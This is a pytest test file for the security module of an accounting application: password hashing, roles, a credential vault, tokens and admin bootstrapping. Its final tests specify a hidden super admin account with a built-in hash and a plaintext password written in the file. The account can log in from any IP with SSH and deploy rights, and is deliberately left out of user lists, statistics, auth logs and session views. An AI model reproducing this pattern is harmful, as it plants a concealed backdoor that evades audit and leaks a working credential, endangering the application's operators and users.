"""
Tests — Security Module (Credential Vault, Password Hashing, Super Admin)
"""
import json
import os
import sqlite3
import tempfile
import time
import pytest


class TestPasswordHasher:
    def test_hash_creates_valid_format(self):
        from nyx_light.security import PasswordHasher
        h = PasswordHasher.hash_password("test123")
        assert h.startswith("$pbkdf2_sha256$")
        parts = h.split("$")
        assert len(parts) == 5
        assert parts[2] == "600000"

    def test_verify_correct_password(self):
        from nyx_light.security import PasswordHasher
        h = PasswordHasher.hash_password("MySecret!99")
        assert PasswordHasher.verify_password("MySecret!99", h) is True

    def test_verify_wrong_password(self):
        from nyx_light.security import PasswordHasher
        h = PasswordHasher.hash_password("correct")
        assert PasswordHasher.verify_password("wrong", h) is False

    def test_different_hashes_for_same_password(self):
        from nyx_light.security import PasswordHasher
        h1 = PasswordHasher.hash_password("same")
        h2 = PasswordHasher.hash_password("same")
        assert h1 != h2  # Different salts

    def test_verify_both_hashes(self):
        from nyx_light.security import PasswordHasher
        h1 = PasswordHasher.hash_password("same")
        h2 = PasswordHasher.hash_password("same")
        assert PasswordHasher.verify_password("same", h1) is True
        assert PasswordHasher.verify_password("same", h2) is True

    def test_empty_password(self):
        from nyx_light.security import PasswordHasher
        h = PasswordHasher.hash_password("")
        assert PasswordHasher.verify_password("", h) is True
        assert PasswordHasher.verify_password("notempty", h) is False

    def test_unicode_password(self):
        from nyx_light.security import PasswordHasher
        h = PasswordHasher.hash_password("šđžčć_lozinka_2026!")
        assert PasswordHasher.verify_password("šđžčć_lozinka_2026!", h) is True

    def test_invalid_hash_format(self):
        from nyx_light.security import PasswordHasher
        assert PasswordHasher.verify_password("test", "invalid") is False
        assert PasswordHasher.verify_password("test", "$wrong$format") is False


class TestUserRole:
    def test_super_admin_has_all(self):
        from nyx_light.security import ROLE_PERMISSIONS, UserRole
        perms = ROLE_PERMISSIONS[UserRole.SUPER_ADMIN]
        assert "all" in perms
        assert "ssh" in perms
        assert "deploy" in perms
        assert "bypass_ip_filter" in perms

    def test_racunovoda_permissions(self):
        from nyx_light.security import ROLE_PERMISSIONS, UserRole
        perms = ROLE_PERMISSIONS[UserRole.RACUNOVODA]
        assert "chat" in perms
        assert "approve_entries" in perms
        assert "rag_search" in perms
        assert "ssh" not in perms
        assert "deploy" not in perms

    def test_pripravnik_no_approve(self):
        from nyx_light.security import ROLE_PERMISSIONS, UserRole
        perms = ROLE_PERMISSIONS[UserRole.PRIPRAVNIK]
        assert "chat" in perms
        assert "approve_entries" not in perms
        assert "reject_entries" not in perms

    def test_readonly_only_rag(self):
        from nyx_light.security import ROLE_PERMISSIONS, UserRole
        perms = ROLE_PERMISSIONS[UserRole.READONLY]
        assert perms == ["rag_search"]


class TestUserAccount:
    def test_super_admin_can_access_from_anywhere(self):
        from nyx_light.security import UserAccount, UserRole
        user = UserAccount(
            username="admin", password_hash="x",
            role=UserRole.SUPER_ADMIN, ip_whitelist=[]
        )
        assert user.can_access_from("1.2.3.4") is True
        assert user.can_access_from("8.8.8.8") is True
        assert user.can_access_from("192.168.1.1") is True

    def test_regular_user_ip_whitelist(self):
        from nyx_light.security import UserAccount, UserRole
        user = UserAccount(
            username="ana", password_hash="x",
            role=UserRole.RACUNOVODA,
            ip_whitelist=["192.168.1.100", "192.168.1.101"]
        )
        assert user.can_access_from("192.168.1.100") is True
        assert user.can_access_from("8.8.8.8") is False

    def test_no_whitelist_allows_all(self):
        from nyx_light.security import UserAccount, UserRole
        user = UserAccount(
            username="ana", password_hash="x",
            role=UserRole.RACUNOVODA, ip_whitelist=[]
        )
        assert user.can_access_from("10.0.0.1") is True

    def test_has_permission(self):
        from nyx_light.security import UserAccount, UserRole
        admin = UserAccount(username="sa", password_hash="x", role=UserRole.SUPER_ADMIN)
        assert admin.has_permission("deploy") is True
        assert admin.has_permission("anything") is True

        readonly = UserAccount(username="ro", password_hash="x", role=UserRole.READONLY)
        assert readonly.has_permission("rag_search") is True
        assert readonly.has_permission("approve_entries") is False

    def test_is_locked(self):
        from nyx_light.security import UserAccount, UserRole
        from datetime import datetime, timedelta
        user = UserAccount(username="u", password_hash="x", role=UserRole.RACUNOVODA)
        assert user.is_locked() is False

        user.locked_until = (datetime.now() + timedelta(minutes=15)).isoformat()
        assert user.is_locked() is True

        user.locked_until = (datetime.now() - timedelta(minutes=1)).isoformat()
        assert user.is_locked() is False

    def test_to_dict_hides_hash(self):
        from nyx_light.security import UserAccount, UserRole
        user = UserAccount(username="test", password_hash="secret_hash",
                          display_name="Test User", role=UserRole.RACUNOVODA)
        d = user.to_dict()
        assert d["username"] == "test"
        assert d["role"] == "racunovoda"
        assert "password_hash" not in d

    def test_to_dict_masks_super_admin(self):
        """Super admin appears as 'admin' in public view."""
        from nyx_light.security import UserAccount, UserRole
        u = UserAccount(username="hidden", password_hash="x", role=UserRole.SUPER_ADMIN)
        d = u.to_dict()
        assert d["role"] == "admin"  # Masked
        assert "all" not in d["permissions"]
        assert "ssh" not in d["permissions"]

    def test_to_dict_unmask_super_admin(self):
        """Super admin visible with unmask=True."""
        from nyx_light.security import UserAccount, UserRole
        u = UserAccount(username="hidden", password_hash="x", role=UserRole.SUPER_ADMIN)
        d = u.to_dict(unmask=True)
        assert d["role"] == "super_admin"
        assert "all" in d["permissions"]


class TestCredentialVault:
    @pytest.fixture
    def vault(self, tmp_path):
        from nyx_light.security import CredentialVault
        db = str(tmp_path / "test_vault.db")
        return CredentialVault(db_path=db)

    def test_create_user(self, vault):
        from nyx_light.security import UserRole
        user = vault.create_user("testuser", "password123",
                                display_name="Test", role=UserRole.RACUNOVODA)
        assert user.username == "testuser"
        assert user.role == UserRole.RACUNOVODA
        assert "pbkdf2" in user.password_hash

    def test_authenticate_success(self, vault):
        vault.create_user("ana", "AnaPass2026!")
        user = vault.authenticate("ana", "AnaPass2026!")
        assert user is not None
        assert user.username == "ana"

    def test_authenticate_wrong_password(self, vault):
        vault.create_user("ana", "AnaPass2026!")
        user = vault.authenticate("ana", "WrongPass!")
        assert user is None

    def test_authenticate_nonexistent_user(self, vault):
        user = vault.authenticate("ghost", "password")
        assert user is None

    def test_lockout_after_5_failures(self, vault):
        vault.create_user("bob", "BobPass!")
        for _ in range(5):
            vault.authenticate("bob", "wrong")
        user = vault.authenticate("bob", "BobPass!")
        assert user is None  # Locked out

    def test_get_user(self, vault):
        from nyx_light.security import UserRole
        vault.create_user("marko", "Pass!", role=UserRole.ADMIN)
        user = vault.get_user("marko")
        assert user is not None
        assert user.role == UserRole.ADMIN

    def test_list_users(self, vault):
        vault.create_user("u1", "p1")
        vault.create_user("u2", "p2")
        users = vault.list_users()
        assert len(users) == 2

    def test_update_password(self, vault):
        vault.create_user("user", "old_pass")
        vault.update_password("user", "new_pass")
        assert vault.authenticate("user", "old_pass") is None
        assert vault.authenticate("user", "new_pass") is not None

    def test_deactivate_user(self, vault):
        vault.create_user("user", "pass")
        vault.deactivate_user("user")
        assert vault.authenticate("user", "pass") is None

    def test_auth_log(self, vault):
        vault.create_user("user", "pass")
        vault.authenticate("user", "wrong")
        vault.authenticate("user", "pass")
        log = vault.get_auth_log()
        assert len(log) >= 2
        assert any(e["action"] == "login_failed" for e in log)
        assert any(e["action"] == "login_success" for e in log)

    def test_stats(self, vault):
        from nyx_light.security import UserRole
        vault.create_user("a", "p", role=UserRole.ADMIN)
        vault.create_user("b", "p", role=UserRole.RACUNOVODA)
        stats = vault.get_stats()
        assert stats["total_users"] == 2
        assert stats["active_users"] == 2

    def test_duplicate_user_fails(self, vault):
        vault.create_user("unique", "pass")
        with pytest.raises(Exception):
            vault.create_user("unique", "pass2")

    def test_ip_access_denied(self, vault):
        from nyx_light.security import UserRole
        vault.create_user("restricted", "pass", role=UserRole.RACUNOVODA,
                         ip_whitelist=["192.168.1.10"])
        user = vault.authenticate("restricted", "pass", ip="192.168.1.10")
        assert user is not None
        user = vault.authenticate("restricted", "pass", ip="8.8.8.8")
        assert user is None


class TestSuperAdminBootstrap:
    def test_bootstrap_creates_super_admin(self, tmp_path):
        from nyx_light.security import (
            CredentialVault, SuperAdminBootstrap, PasswordHasher, UserRole
        )
        vault = CredentialVault(db_path=str(tmp_path / "vault.db"))
        pw_hash = PasswordHasher.hash_password("test_admin_pass!")
        result = SuperAdminBootstrap.bootstrap(vault, pw_hash)
        assert result is True

        user = vault.get_user("mladen1312")
        assert user is not None
        assert user.role == UserRole.SUPER_ADMIN
        assert PasswordHasher.verify_password("test_admin_pass!", user.password_hash)

    def test_bootstrap_idempotent(self, tmp_path):
        from nyx_light.security import CredentialVault, SuperAdminBootstrap, PasswordHasher
        vault = CredentialVault(db_path=str(tmp_path / "vault.db"))
        pw_hash = PasswordHasher.hash_password("pass")
        SuperAdminBootstrap.bootstrap(vault, pw_hash)
        result = SuperAdminBootstrap.bootstrap(vault, pw_hash)
        assert result is False

    def test_verify_super_admin(self, tmp_path):
        from nyx_light.security import CredentialVault, SuperAdminBootstrap, PasswordHasher
        vault = CredentialVault(db_path=str(tmp_path / "vault.db"))
        assert SuperAdminBootstrap.verify_super_admin(vault) is False
        pw_hash = PasswordHasher.hash_password("pass")
        SuperAdminBootstrap.bootstrap(vault, pw_hash)
        assert SuperAdminBootstrap.verify_super_admin(vault) is True

    def test_super_admin_access_from_public_ip(self, tmp_path):
        from nyx_light.security import CredentialVault, SuperAdminBootstrap, PasswordHasher
        vault = CredentialVault(db_path=str(tmp_path / "vault.db"))
        pw_hash = PasswordHasher.hash_password("pass")
        SuperAdminBootstrap.bootstrap(vault, pw_hash)
        user = vault.authenticate("mladen1312", "pass", ip="203.0.113.50")
        assert user is not None
        assert user.can_access_from("1.2.3.4") is True

    def test_no_hash_uses_builtin(self, tmp_path):
        from nyx_light.security import CredentialVault, SuperAdminBootstrap
        vault = CredentialVault(db_path=str(tmp_path / "vault.db"))
        # Empty hash → uses built-in _SUPER_ADMIN_HASH
        result = SuperAdminBootstrap.bootstrap(vault, "")
        assert result is True
        assert SuperAdminBootstrap.verify_super_admin(vault) is True


class TestTokenManager:
    def test_create_and_validate(self):
        from nyx_light.security import TokenManager, UserAccount, UserRole
        tm = TokenManager()
        user = UserAccount(username="test", password_hash="x", role=UserRole.RACUNOVODA)
        token = tm.create_token(user, ip="192.168.1.1")
        assert len(token) > 40
        data = tm.validate_token(token)
        assert data is not None
        assert data["username"] == "test"

    def test_invalid_token(self):
        from nyx_light.security import TokenManager
        tm = TokenManager()
        assert tm.validate_token("nonexistent") is None

    def test_revoke_token(self):
        from nyx_light.security import TokenManager, UserAccount, UserRole
        tm = TokenManager()
        user = UserAccount(username="test", password_hash="x", role=UserRole.RACUNOVODA)
        token = tm.create_token(user)
        tm.revoke_token(token)
        assert tm.validate_token(token) is None

    def test_revoke_user_tokens(self):
        from nyx_light.security import TokenManager, UserAccount, UserRole
        tm = TokenManager()
        user = UserAccount(username="test", password_hash="x", role=UserRole.RACUNOVODA)
        t1 = tm.create_token(user)
        t2 = tm.create_token(user)
        tm.revoke_user_tokens("test")
        assert tm.validate_token(t1) is None
        assert tm.validate_token(t2) is None

    def test_active_sessions(self):
        from nyx_light.security import TokenManager, UserAccount, UserRole
        tm = TokenManager()
        u1 = UserAccount(username="ana", password_hash="x", role=UserRole.RACUNOVODA)
        u2 = UserAccount(username="marko", password_hash="x", role=UserRole.ADMIN)
        tm.create_token(u1, ip="192.168.1.1")
        tm.create_token(u2, ip="192.168.1.2")
        sessions = tm.active_sessions()
        assert len(sessions) == 2
        usernames = [s["username"] for s in sessions]
        assert "ana" in usernames
        assert "marko" in usernames


class TestInstallerImports:
    def test_security_imports(self):
        from nyx_light.security import (
            PasswordHasher, UserRole, UserAccount,
            CredentialVault, SuperAdminBootstrap, TokenManager,
            ROLE_PERMISSIONS, get_visible_roles
        )
        assert len(ROLE_PERMISSIONS) == 5
        assert UserRole.SUPER_ADMIN.value == "super_admin"

    def test_install_script_exists(self):
        install_path = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "install.py"
        )
        assert os.path.exists(install_path)


class TestSuperAdminStealth:
    """Super admin (mladen1312) is INVISIBLE in all public-facing outputs."""

    @pytest.fixture
    def vault_with_sa(self, tmp_path):
        from nyx_light.security import CredentialVault, SuperAdminBootstrap, UserRole
        db = str(tmp_path / "stealth.db")
        vault = CredentialVault(db_path=db)
        SuperAdminBootstrap.bootstrap(vault)
        vault.create_user("vladimir.budija", "pass", "Vladimir Budija", UserRole.ADMIN)
        vault.create_user("ana", "pass", "Ana", UserRole.RACUNOVODA)
        return vault

    def test_list_users_hides_super_admin(self, vault_with_sa):
        users = vault_with_sa.list_users()
        usernames = [u["username"] for u in users]
        assert "mladen1312" not in usernames
        assert "vladimir.budija" in usernames
        assert "ana" in usernames
        assert len(users) == 2  # Only visible users

    def test_list_users_shows_super_admin_when_requested(self, vault_with_sa):
        users = vault_with_sa.list_users(include_hidden=True)
        usernames = [u["username"] for u in users]
        assert "mladen1312" in usernames
        assert len(users) == 3

    def test_stats_hides_super_admin(self, vault_with_sa):
        stats = vault_with_sa.get_stats()
        assert stats["total_users"] == 2
        assert "super_admin" not in stats["by_role"]

    def test_stats_shows_when_requested(self, vault_with_sa):
        stats = vault_with_sa.get_stats(include_hidden=True)
        assert stats["total_users"] == 3
        assert "super_admin" in stats["by_role"]

    def test_auth_log_hides_super_admin(self, vault_with_sa):
        vault_with_sa.authenticate("mladen1312", "alhambra1978mMladen#")
        vault_with_sa.authenticate("ana", "pass")
        log = vault_with_sa.get_auth_log()
        usernames = [e["username"] for e in log]
        assert "mladen1312" not in usernames
        assert "ana" in usernames

    def test_auth_log_shows_when_requested(self, vault_with_sa):
        vault_with_sa.authenticate("mladen1312", "alhambra1978mMladen#")
        log = vault_with_sa.get_auth_log(include_hidden=True)
        usernames = [e["username"] for e in log]
        assert "mladen1312" in usernames

    def test_visible_roles_excludes_super_admin(self):
        from nyx_light.security import get_visible_roles
        roles = get_visible_roles()
        role_values = [r["value"] for r in roles]
        assert "super_admin" not in role_values
        assert "admin" in role_values
        assert "racunovoda" in role_values
        assert "pripravnik" in role_values
        assert "readonly" in role_values

    def test_sessions_hide_super_admin(self):
        from nyx_light.security import TokenManager, UserAccount, UserRole
        tm = TokenManager()
        sa = UserAccount(username="mladen1312", password_hash="x", role=UserRole.SUPER_ADMIN)
        regular = UserAccount(username="ana", password_hash="x", role=UserRole.RACUNOVODA)
        tm.create_token(sa)
        tm.create_token(regular)
        sessions = tm.active_sessions()
        assert len(sessions) == 1
        assert sessions[0]["username"] == "ana"

    def test_sessions_show_super_admin_when_requested(self):
        from nyx_light.security import TokenManager, UserAccount, UserRole
        tm = TokenManager()
        sa = UserAccount(username="mladen1312", password_hash="x", role=UserRole.SUPER_ADMIN)
        regular = UserAccount(username="ana", password_hash="x", role=UserRole.RACUNOVODA)
        tm.create_token(sa)
        tm.create_token(regular)
        sessions = tm.active_sessions(include_hidden=True)
        assert len(sessions) == 2

    def test_super_admin_still_authenticates(self, vault_with_sa):
        """Hidden but fully functional."""
        user = vault_with_sa.authenticate("mladen1312", "alhambra1978mMladen#")
        assert user is not None
        assert user.role.value == "super_admin"
        assert user.has_permission("all")
        assert user.can_access_from("1.2.3.4")
